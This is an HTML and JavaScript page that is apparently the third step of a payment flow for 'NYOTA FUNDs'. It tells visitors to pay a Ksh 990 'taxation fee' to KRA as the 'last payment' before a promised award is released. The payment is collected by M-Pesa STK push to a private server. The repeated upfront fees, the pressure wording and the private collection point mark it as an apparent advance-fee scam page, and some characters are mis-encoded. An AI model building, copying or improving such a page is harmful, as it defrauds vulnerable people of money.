<!DOCTYPE html>
<html lang="en">
<!-- Removed Brevo Conversations and added LiveChat widget -->
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Payment 3 ‚Äì Taxation Fee</title>
<link rel="stylesheet" href="style.css" />

<style>
#liveChatBtn{
  position:fixed;bottom:20px;right:20px;
  background:#25D366;color:#fff;
  border-radius:50%;width:60px;height:60px;
  border:none;cursor:pointer;font-size:28px;
  display:flex;align-items:center;justify-content:center;
  animation:bounce 1.5s infinite;z-index:999;
}
@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
@keyframes spin{100%{transform:rotate(360deg)}}

/* Popup-specific styles to ensure text is visible regardless of global css */
#popupOverlay .popupContent{
  background:#fff;
  max-width:360px;
  margin:auto;
  padding:20px 18px;
  border-radius:14px;
  text-align:center;
  position:fixed;
  left:50%;
  top:50%;
  transform:translate(-50%,-50%);
  color:#111 !important;
  font-size:15px;
  line-height:1.4;
  box-shadow:0 6px 24px rgba(0,0,0,0.25);
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  gap:12px;
  z-index:1000;
  min-height:160px;
}

#popupOverlay .popupContent h3{
  margin:0;
  font-size:18px;
  font-weight:600;
  color: #111;
}
#popupOverlay .popupContent p{
  margin:0;
  color:#333;
  font-size:14px;
}

#popupSpinner{
  height:48px;
  display:flex;
  align-items:center;
  justify-content:center;
}

#popupOverlay .popupContent #popupBtn{
  display:block;
  width:100%;
  padding:12px;
  background:#0a6ebd;
  color:#fff;
  border:none;
  border-radius:8px;
  cursor:pointer;
  margin-top:6px;
}
</style>
</head>

<body>

<!-- LiveChat Widget -->
<script>
  window.__lc = window.__lc || {};
  window.__lc.license = 19513072; // Your LiveChat license ID
  window.__lc.chat_between_groups = false;
  (function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
</script>

<!-- Your existing HTML content -->
<div class="container">
  <h2>Taxation Fee</h2>

  <p style="font-size:18px;font-weight:bold;">
    Your Selected NYOTA FUNDs: <strong>Ksh <span id="fundAmount">22000</span></strong>
  </p>

  <p style="font-size:15px;line-height:1.6;color:#333;">
    You're in good track well done . You are required to pay <strong>Ksh 990</strong> to KRA . Your award is subjected to taxation. That's the last payment. Then you receive your nyota fund desired limit Congratulations.
  </p>

  <p style="font-size:15px;line-height:1.6;color:#0a6ebd;font-weight:bold;">
    Please complete this final step. Once done, your
    <strong>NYOTA FUNDs will be delivered safely to your chosen network.</strong><br>
    Don‚Äôt give up now ‚Äî you‚Äôre just one step away!
  </p>

  <form id="payment3Form">
    <input id="senderName" placeholder="Full Name" required>
    <input id="senderPhone" placeholder="07XXXXXXXX" required>
    <button id="payBtn" type="submit">Pay Now</button>
  </form>
</div>

<!-- POPUP -->
<div id="popupOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:999;">
  <div class="popupContent">
    <h3 id="popupTitle"></h3>
    <div id="popupSpinner"></div>
    <p id="popupMessage"></p>
    <button id="popupBtn" style="display:none">OK</button>
  </div>
</div>

<script src="firebase-config.js"></script>
<script>
/* ---- Access protection ---- */
if(!localStorage.getItem("payment2Completed")){
  window.location.href = "payment2.html";
}

/* ---- Elements ---- */
const senderName = document.getElementById("senderName");
const senderPhone = document.getElementById("senderPhone");
const payBtn = document.getElementById("payBtn");

const popupOverlay = document.getElementById("popupOverlay");
const popupTitle = document.getElementById("popupTitle");
const popupSpinner = document.getElementById("popupSpinner");
const popupMessage = document.getElementById("popupMessage");
const popupBtn = document.getElementById("popupBtn");

/* ---- Load data ---- */
const userPhone = localStorage.getItem("userPhone");
if(userPhone){
  senderPhone.value = userPhone;
  senderPhone.readOnly = true;
}

const fund = JSON.parse(localStorage.getItem("selectedFund")) || { amount: 0 };
document.getElementById("fundAmount").innerText = fund.amount;

/* ---- Popup helper ---- */
function showPopup(title, message="Please wait‚Ä¶", spin=false, ok=false){
  popupTitle.innerText = title;
  popupMessage.innerHTML = message;
  popupSpinner.innerHTML = spin
    ? '<div style="width:30px;height:30px;border:4px solid #eee;border-top:4px solid #0a6ebd;border-radius:50%;margin:10px auto;animation:spin 1s linear infinite"></div>'
    : '';
  popupBtn.style.display = ok ? "block" : "none";
  popupOverlay.style.display = "block";
  popupTitle.style.color = "#111";
  popupMessage.style.color = "#333";
}

popupBtn.onclick = () => popupOverlay.style.display = "none";

/* ---- Submit ---- */
document.getElementById("payment3Form").addEventListener("submit", async e => {
  e.preventDefault();

  const name = senderName.value.trim();
  const phone = senderPhone.value.trim();

  if(name.length < 2 || phone.length < 10){
    return alert("Enter valid details");
  }

  payBtn.disabled = true;

  showPopup("Processing‚Ä¶","Sending STK push.",true,false);

  try{
    const res = await fetch("https://nyota-server-collins.onrender.com/pay",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({ phone, amount:990, loan_amount: fund.amount })
    });

    const data = await res.json();
    if(!data.success) throw new Error();

    showPopup("STK Sent üì≤","Enter your M-Pesa PIN to complete payment.",true,false);
    pollReceipt(data.reference);

  }catch{
    payBtn.disabled = false;
    showPopup("Payment Failed","Unable to send STK push.",false,true);
  }
});

/* ---- Receipt polling (FIXED) ---- */
function pollReceipt(ref){
  let attempts = 0;

  showPopup(
    "Waiting for Payment ‚è≥",
    "Please check your phone and enter your M-Pesa PIN.<br>Do not close this page.",
    true,
    false
  );

  const interval = setInterval(async () => {
    attempts++;

    if(attempts > 60){
      clearInterval(interval);
      return showPopup(
        "Still Processing ‚è≥",
        "Payment is taking longer than expected.<br>Please tap OK and wait.",
        false,
        true
      );
    }

    try{
      const r = await fetch(`https://nyota-server-collins.onrender.com/receipt/${ref}`,{cache:"no-store"});
      if(!r.ok) return;

      const d = await r.json();
      const status = (d?.receipt?.status || "").toLowerCase();

      if(status === "pending") return;

      clearInterval(interval);

      if(["processing","success","completed","paid"].includes(status)){
        localStorage.setItem("payment3Completed","yes");

        showPopup(
          "Payment Confirmed ‚úÖ",
          "Ksh 990 received successfully.<br><strong>Your NYOTA FUNDs will be released within 24 hours.</strong>",
          false,
          true
        );
       // Auto redirect after 4 seconds
        setTimeout(() => {
          window.location.href = "success.html";
        }, 4000);
      }else{
        payBtn.disabled = false;
        showPopup(
          "Payment Failed ‚ùå try again",
          d?.receipt?.status_note || "Payment failed.",
          false,
          true
        );
      }
    }catch{}
  }, 5000);
}

function openChat(){
  window.open("chat.html","_blank","width=400,height=600");
}
</script>

</body>
   </html>
